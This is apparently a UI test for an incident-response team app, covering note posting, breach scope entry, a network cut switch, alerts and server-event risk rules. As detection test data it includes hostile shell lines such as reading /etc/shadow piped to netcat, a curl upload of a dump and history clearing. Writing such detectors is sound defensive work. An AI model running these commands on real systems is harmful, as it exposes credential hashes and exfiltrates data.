// Drives the station window the way a person would: typing, clicking the
// regions the last frame drew, function keys. Then checks what reached the
// log. Needs SDL_VIDEODRIVER=offscreen (run.sh sets it).

#include "../src/util.HC"
#include "../src/crypto.HC"
#include "../src/link.HC"
#include "../src/log.HC"
#include "../src/events.HC"
#include "../src/station.HC"
#include "../src/team.HC"
#include "../src/deadlines.HC"
#include "../src/sdl2.HC"
#include "../src/canvas.HC"
#include "../src/app.HC"

extern "c" I32 system(U8 *command);
extern "c" I32 setenv(U8 *name, U8 *value, I32 overwrite);

I64 g_failed = 0;

U0 Check(Bool ok, U8 *name)
{
  if (ok) {
    "ok    %s\n", name;
  } else {
    "FAIL  %s\n", name;
    g_failed++;
  }
}

U0 Type(App *a, U8 *text)
{
  OnText(a, text);
}

U0 Key(App *a, I64 sym, I64 mod = 0)
{
  OnKey(a, sym, mod);
}

// Draws a frame, then clicks the middle of the region with this action.
Bool Click(App *a, I64 id, I64 arg = 0)
{
  Draw(a);
  for (I64 i = 0; i < a->hit_count; i++) {
    Hit *t = &a->hits[i];
    if (t->id == id && t->arg == arg) {
      OnClick(a, t->x + t->w / 2, t->y + t->h / 2);
      return TRUE;
    }
  }
  return FALSE;
}

Entry *Newest(App *a)
{
  return &a->st->log->entries[a->st->log->count - 1];
}

// Appends text to the station's feed file, as tools/ark-watch does.
U0 Feed(App *a, U8 *text)
{
  U8 *path = StationPath(a->st, "feed");
  I32 fd = open(path, O_WRONLY | O_CREAT | O_APPEND, MODE_FILE);
  WriteAll(fd, text, StrLen(text));
  close(fd);
  Free(path);
  PollFeed(a);
}

I64 Hits(App *a, I64 id)
{
  Draw(a);
  I64 n = 0;
  for (I64 i = 0; i < a->hit_count; i++)
    if (a->hits[i].id == id)
      n++;
  return n;
}

I64 FindEvent(Log *log, U8 *detail)
{
  for (I64 i = log->count - 1; i >= 0; i--)
    if (log->entries[i].kind == KIND_EVENT && strstr(log->entries[i].body, detail) != NULL)
      return i;
  return -1;
}

U0 Deliver(Station *from, Station *to)
{
  U8 *msg = MAlloc(MSG_MAX);
  for (I64 i = 0; i < from->log->count; i++)
    StationReceive(to, msg, MakeMessage(from, &from->log->entries[i], msg));
  Free(msg);
}

I32 Main(I32 argc, U8 **argv)
{
  CryptoInit();
  system("rm -rf build/tmp-ui-test build/tmp-ui-test-b");
  App *a = AppNew("build/tmp-ui-test", "/nonexistent", NULL);
  if (!CanvasOpen(a->cv, "test", "assets/fonts")) {
    "canvas: %s\n", SDL_GetError();
    return 1;
  }
  Check(a->mode == MODE_NEW_NAME, "a new directory starts at the name step");

  Type(a, "Dana");
  Key(a, KEY_RETURN);
  Type(a, "short");
  Key(a, KEY_RETURN);
  Check(a->mode == MODE_NEW_PASS, "a passphrase under 8 characters is refused");
  Type(a, "correct horse");
  Key(a, KEY_RETURN);
  Type(a, "correct horsf");
  Key(a, KEY_RETURN);
  Check(a->mode == MODE_NEW_PASS, "mismatched passphrases go back a step");
  Type(a, "correct horse");
  Key(a, KEY_RETURN);
  Type(a, "correct horse");
  Check(Click(a, H_CONTINUE), "Continue button is clickable");
  Check(a->mode == MODE_NEW_CHOICE, "station created after matching passphrases");
  Check(Click(a, H_START), "Start tile is clickable");
  Type(a, "Ransomware on FS-01");
  Key(a, KEY_RETURN);
  Check(Ready(a) && a->st->log->count == 1, "incident opened with a GENESIS entry");
  Check(IsAdmin(a->st), "the station that opens it is admin");

  Type(a, "Ransom note on FS-01");
  Check(a->focus == FLD_COMPOSE, "typing on Overview starts a note");
  Key(a, KEY_RETURN);
  Entry *e = Newest(a);
  Check(a->st->log->count == 2 && e->kind == KIND_NOTE && e->phase == PHASE_DETECT,
        "Enter posts the note under DETECT");
  Check(StrCmp(e->body, "Ransom note on FS-01") == 0 && a->fields[FLD_COMPOSE].len == 0,
        "note text is kept and the box clears");

  Check(Click(a, H_PHASE, PHASE_ERADICATE), "phase buttons are clickable");
  Check(IncidentPhase(a) == PHASE_ERADICATE, "clicking a phase sets it for the incident");
  Check(Newest(a)->kind == KIND_NOTE && Newest(a)->phase == PHASE_ERADICATE, "the phase change is a logged note");

  Check(Click(a, H_KIND, KIND_CHAT), "Chat toggle is clickable");
  Type(a, "pulling the switch");
  Check(Click(a, H_SEND), "Send is clickable");
  Check(Newest(a)->kind == KIND_CHAT, "chat posts as CHAT");

  I64 before = a->st->log->count;
  Key(a, KEY_F4);
  Check(a->view == V_SCOPE && a->scope_open && a->focus == FLD_ASSET, "F4 opens the scope form on the asset field");
  Key(a, KEY_RETURN);
  Check(a->scope_error[0] != 0 && a->st->log->count == before, "an empty form shows an error and posts nothing");
  Type(a, "HR-DB");
  Key(a, KEY_TAB);
  Type(a, "tx");
  Key(a, KEY_TAB);
  Type(a, "4120");
  Click(a, H_TYPE, 0);
  Click(a, H_STATUS, 1);
  Key(a, KEY_RETURN);
  Check(a->st->log->count == before + 1 && Newest(a)->kind == KIND_SCOPE, "a complete form posts one SCOPE entry");
  Check(StrCmp(Newest(a)->body, "HR-DB|PII|TX|4120|EXFILTRATED") == 0, "scope fields are stored in order, code upper-cased");
  Check(!a->scope_open, "the form closes after saving");
  Clock clocks[RULES];
  Check(Deadlines(a->st->log, clocks) == 2, "4120 exfiltrated Texans start the resident and AG clocks");

  Click(a, H_SCOPE_OPEN);
  Type(a, "imaging");
  Click(a, H_WHERE, 3);
  Click(a, H_UNKNOWN);
  Click(a, H_TYPE, 1);
  Click(a, H_STATUS, 2);
  Click(a, H_SCOPE_SAVE);
  Check(StrCmp(Newest(a)->body, "imaging|PHI|EU|?|SUSPECTED") == 0, "quick picks and Unknown fill the scope entry");

  Key(a, 'f', KMOD_CTRL);
  Type(a, "hr-db");
  Check(a->view == V_LOG && a->focus == FLD_SEARCH, "Ctrl+F searches and shows the log");
  Key(a, KEY_ESCAPE);
  Check(a->fields[FLD_SEARCH].len == 0, "Esc clears the search");

  Check(Click(a, H_NAV, V_TEAM) && a->view == V_TEAM, "sidebar opens Team");
  Check(!Click(a, H_APPROVE), "Approve isn't clickable with nobody waiting");
  a->team.join_pending = TRUE;
  MemSet(a->team.join_pk, 9, PK_BYTES);
  StrCpy(a->team.join_name, "Priya");
  before = a->st->log->count;
  Check(Click(a, H_APPROVE), "Approve is clickable when someone waits");
  Check(a->st->log->count == before + 1 && Newest(a)->kind == KIND_MEMBER_ADD && !a->team.join_pending,
        "approving logs MEMBER_ADD and clears the request");


  // Stand-ins for nmcli, so the test never touches the real network.
  setenv("ARK_CUT_CMD", "touch build/tmp-ui-test/cut", 1);
  setenv("ARK_RESTORE_CMD", "rm build/tmp-ui-test/cut", 1);
  Check(!Click(a, H_RESTORE), "RESTORE isn't clickable while the internet is on");
  Click(a, H_CUT);
  Check(!IsCut(a), "one on-screen CUT press only arms it");
  Click(a, H_CUT);
  Check(IsCut(a) && access("build/tmp-ui-test/cut", 0) == 0, "a second press runs the cut command and logs it");
  Check(Newest(a)->kind == KIND_NETWORK, "the cut is a signed NETWORK entry");
  before = a->st->log->count;
  PanelCommand(a, "CUT");
  Check(a->st->log->count == before, "cutting twice logs nothing new");
  PanelCommand(a, "RESTORE");
  Check(!IsCut(a) && access("build/tmp-ui-test/cut", 0) != 0, "the panel's RESTORE runs the restore command");
  PanelCommand(a, "CUT");
  Check(IsCut(a), "the panel's CUT works with one press");
  setenv("ARK_RESTORE_CMD", "false", 1);
  Click(a, H_RESTORE);
  Check(IsCut(a), "a failed restore command leaves the cut in place");
  setenv("ARK_CUT_CMD", "false", 1);
  setenv("ARK_RESTORE_CMD", "true", 1);
  Click(a, H_RESTORE);
  Click(a, H_CUT);
  Click(a, H_CUT);
  Check(!IsCut(a), "a failed cut command is logged but not shown as cut");

  // An alert from another member, as if it arrived over the relay.
  Station *b = MAlloc(sizeof(Station));
  StationInit(b, "build/tmp-ui-test-b");
  StationCreate(b, b->dir, "Marcus", "another passphrase");
  MemCpy(b->keys[0], a->st->keys[0], KEY_BYTES);
  b->have_key[0] = TRUE;
  b->epoch = 0;
  a->team.join_pending = TRUE;
  MemCpy(a->team.join_pk, b->pk, PK_BYTES);
  StrCpy(a->team.join_name, "Marcus");
  Approve(a);
  U8 *msg = MAlloc(MSG_MAX);
  for (I64 i = 0; i < a->st->log->count; i++)
    StationReceive(b, msg, MakeMessage(a->st, &a->st->log->entries[i], msg));
  I64 len = Post(b, KIND_ALERT, PHASE_CONTAIN, "Files on FS-01 changed at 03:12", 31, msg);
  StationReceive(a->st, msg, len);
  Check(AlertCount(a) == 1 && UnackedAlerts(a) == 1, "an alert from another station is waiting");
  Check(Click(a, H_ACK), "Acknowledge is clickable");
  Check(UnackedAlerts(a) == 0, "acknowledging clears it");
  Click(a, H_KIND, KIND_ALERT);
  Type(a, "testing");
  Key(a, KEY_RETURN);
  Check(Newest(a)->kind == KIND_ALERT && AlertCount(a) == 1 && UnackedAlerts(a) == 0, "my own alerts post but don't alert me");

  // Server events: parsing a feed line.
  Event ev;
  U8 *line = "shell\teve\tfs-01\tcat /etc/shadow | nc x 1";
  Check(FeedLine(line, StrLen(line), &ev) && ev.source == EV_SHELL && StrCmp(ev.user, "eve") == 0 &&
        StrCmp(ev.detail, "cat /etc/shadow / nc x 1") == 0, "a feed line parses, with '|' made safe");
  line = "telnet\teve\tfs-01\tx";
  Check(!FeedLine(line, StrLen(line), &ev), "an unknown source is refused");
  line = "shell\teve\tfs-01";
  Check(!FeedLine(line, StrLen(line), &ev), "a line with three fields is refused");
  line = "shell\teve\tfs-01\tawk -F\t x";
  Check(FeedLine(line, StrLen(line), &ev) && StrCmp(ev.detail, "awk -F  x") == 0, "a tab in the command stays in the detail");

  // Risk rules.
  U8 *why;
  ev.source = EV_SHELL;
  StrCpy(ev.detail, "cat /etc/shadow");
  Check(EventRisk(&ev, 12, &why) == RISK_SUS, "reading /etc/shadow is suspicious");
  StrCpy(ev.detail, "ls -la /srv");
  Check(EventRisk(&ev, 12, &why) == RISK_NONE, "ls is not flagged");
  StrCpy(ev.detail, "CURL -T dump.tgz https://x");
  Check(EventRisk(&ev, 12, &why) == RISK_SUS, "uploading with curl is suspicious, any case");
  StrCpy(ev.detail, "curl https://example.com");
  Check(EventRisk(&ev, 12, &why) == RISK_WATCH, "a plain download is only worth watching");
  ev.source = EV_LOGIN;
  StrCpy(ev.user, "marcus");
  StrCpy(ev.detail, "ssh from 10.0.4.22");
  Check(EventRisk(&ev, 14, &why) == RISK_NONE && EventRisk(&ev, 3, &why) == RISK_WATCH,
        "a login is flagged only at night");
  StrCpy(ev.user, "root");
  Check(EventRisk(&ev, 14, &why) == RISK_SUS, "a root login is suspicious");

  // The feed file turns into signed server events.
  I64 before_feed = a->st->log->count;
  Feed(a, "shell\tsvc-backup\tfs-01\tcat /etc/shadow\nbogus line\nlogin\tmarcus\tfs-01\tssh from 10.0.4.22\n");
  Check(a->st->log->count == before_feed + 2 && Newest(a)->kind == KIND_EVENT,
        "two good feed lines become events, the bad one is skipped");
  Feed(a, "shell\tsvc-backup\tfs-01\thistory");
  Check(a->st->log->count == before_feed + 2, "half a line waits for its newline");
  Feed(a, " -c\n");
  Check(a->st->log->count == before_feed + 3 && strstr(Newest(a)->body, "history -c") != NULL,
        "the rest of the line completes it");
  a->feed_window = time(NULL);
  a->feed_posted = 0;
  before_feed = a->st->log->count;
  U8 *burst = MAlloc(64 * 40);
  burst[0] = 0;
  for (I64 i = 0; i < 40; i++)
    StrCpy(burst + StrLen(burst), "shell\tbot\tfs-01\tls\n");
  Feed(a, burst);
  Check(a->st->log->count == before_feed + FEED_RATE, "a burst is capped at the rate limit");
  a->feed_window -= FEED_WINDOW;
  Feed(a, "shell\tbot\tfs-01\tls\n");
  Check(a->st->log->count == before_feed + FEED_RATE + 2 && strstr(a->st->log->entries[a->st->log->count - 2].body, "10 more events") != NULL,
        "the dropped events are counted in one entry");

  a->view = V_LOG;
  Check(Hits(a, H_EVENT) == 0, "the chat log doesn't show server events");
  a->view = V_SERVER;
  Check(Hits(a, H_EVENT) > 0, "the server log does");
  RefreshRisk(a);
  Check(a->sus_open == 2, "two suspicious events wait for a report");
  I64 shadow = FindEvent(a->st->log, "cat /etc/shadow");
  Check(Click(a, H_SFILTER, SF_SUS) && Hits(a, H_EVENT) == 2, "the Suspicious filter shows just those two");
  Check(Click(a, H_EVENT, shadow) && a->selected == shadow, "clicking a row picks it");
  Check(Hits(a, H_REPORT) == 0, "the manager has no report button");

  // A member reports it; the manager's station sees the alert.
  App *m = AppNew("build/tmp-ui-test-b", "/nonexistent", NULL);
  m->st = b;
  m->cv = a->cv;
  m->mode = MODE_READY;
  Deliver(a->st, b);
  I64 bshadow = FindEvent(b->log, "cat /etc/shadow");
  m->view = V_SERVER;
  m->selected = bshadow;
  I64 alerts_before = AlertCount(a);
  Check(Click(m, H_REPORT, bshadow), "a member can press Report to manager");
  Check(b->log->entries[b->log->count - 1].kind == KIND_ALERT, "the report is a signed alert");
  Deliver(b, a->st);
  RefreshRisk(a);
  Check(AlertCount(a) == alerts_before + 1 && UnackedAlerts(a) == 1, "the manager gets the alert");
  Check(ReportOf(a, &a->st->log->entries[shadow]) != NULL && a->sus_open == 1, "the event shows as reported");
  Check(StrNCmp(AlertText(a->st->log->entries[a->st->log->count - 1].body), "svc-backup on fs-01", 19) == 0,
        "the alert reads without its reference");
  I64 bcount = b->log->count;
  ReportEvent(m, bshadow);
  Check(b->log->count == bcount, "an event is reported once");
  m->view = V_SERVER;
  Check(Hits(m, H_REPORT) == 0, "and the button is gone after");
  a->alerts_acked = AlertCount(a);

  for (I64 v = 0; v < VIEWS; v++) {
    a->view = v;
    Draw(a);
  }
  Check(TRUE, "every page draws with a cut, alerts and server events in the log");

  Click(a, H_LOCK);
  Check(!a->quit, "one lock press only arms it");
  Key(a, KEY_F12);
  Check(a->quit, "a second press wipes and quits");
  U8 zero[SK_BYTES];
  MemSet(zero, 0, SK_BYTES);
  Check(Same(a->st->sk, zero, SK_BYTES), "locking zeroes the secret key");

  CanvasClose(a->cv);
  if (g_failed > 0)
    return 1;
  return 0;
}
